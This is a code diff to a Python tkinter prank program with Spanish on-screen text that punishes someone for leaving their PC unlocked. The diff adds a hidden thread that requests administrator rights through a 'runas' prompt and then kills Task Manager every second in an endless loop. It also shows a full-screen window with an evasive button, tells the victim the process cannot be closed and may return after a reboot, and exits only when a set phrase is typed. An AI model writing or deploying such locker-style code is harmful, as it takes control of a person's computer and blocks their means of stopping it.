@@ -4,13 +4,33 @@ from PIL import Image, ImageTk
 import tkinter as tk
 import random
 import os
-import psutil
+import threading
+import time
+import sys
+import ctypes
+import subprocess
 
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def cerrar_programa():
+    if is_admin():
+        ti = 0
+        while True:
+            subprocess.run("taskkill /f /im Taskmgr.exe", shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+            ti += 1
+            time.sleep(1)
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+
+thread = threading.Thread(target=cerrar_programa)
+thread.start()
 num_iteraciones = 0
-ti = 0
-name = "Taskmgr.exe"
 
-def smooth_move_button(new_x, new_y, steps=600):
+def smooth_move_button(new_x, new_y, steps=40):
     step_x = (new_x - button.winfo_x()) / steps
     step_y = (new_y - button.winfo_y()) / steps
 
@@ -49,9 +69,6 @@ def create_top_level_window():
     converted_img = img.convert('RGB')
     tk_image = ImageTk.PhotoImage(converted_img)
     num_iteraciones += 1
-
-    # width = random.randint(1000, 1920)
-    # height = random.randint(200, 1080)
     width = 1920
     height = 1080
     x_position = int((width/2) - (width/2))
@@ -68,14 +85,14 @@ def create_top_level_window():
     label_principal = tk.Label(top_level_window, text="No debo dejar la PC desbloqueada", font=("Helvetica", 48), bg="black", fg="white")
     label_principal.pack(expand=True)
     
-    label_secundaria = tk.Label(top_level_window, text="Si logras apretar el boton 'Accept', tenés 5 segundos para cerrar el proceso antes de que se abra de nuevo.", font=("Helvetica", 24), bg="black", fg="white")
+    label_secundaria = tk.Label(top_level_window, text="No hay nada que puedas hacer para cerrar el proceso a menos que sepas el nombre del archivo.", font=("Helvetica", 24), bg="black", fg="white")
     label_secundaria.pack(expand=True)
     
-    label_final = tk.Label(top_level_window, text="Si no lo logras, tendrás que reiniciar la PC.", font=("Helvetica", 14), bg="black", fg="white")
+    label_final = tk.Label(top_level_window, text="Es posible que, aunque reinicies la PC, se vuelva a ejecutar la wea.", font=("Helvetica", 14), bg="black", fg="white")
     label_final.pack(expand=True)
     
     if num_iteraciones > 1:
-        label_opcional = tk.Label(top_level_window, text="Si queres terminar rápidamente con tu sufrimiento, escribí 'Debo traer panificados' en el campo de texto de abajo.", font=("Helvetica", 14), bg="black", fg="white")
+        label_opcional = tk.Label(top_level_window, text="Escribí 'Debo traer panificados' en el campo de texto de abajo para cerrar el proceso.", font=("Helvetica", 14), bg="black", fg="white")
         label_opcional.pack(expand=True)
         
         entry = tk.Entry(top_level_window, font=("Helvetica", 14), bg="white", fg="black")
@@ -94,7 +111,6 @@ def create_top_level_window():
     top_level_window.bind('<Configure>', on_move)
     top_level_window.bind('<Unmap>', on_minimize)
     top_level_window.bind('<Motion>', move_button)
-    top_level_window.bind('<Key>', cerrar_programa)
     
 def verificar_frase(event=None):
     frase_ingresada = entry.get().lower()
@@ -102,14 +118,6 @@ def verificar_frase(event=None):
 
     if frase_ingresada == frase_correcta:
         os._exit(0)
-
-def cerrar_programa(event):
-    global ti, name
-    for proc in psutil.process_iter():
-        if proc.name() == name:
-            proc.kill()
-            ti += 1
-            break
 
 def on_move(event):
     global window_position
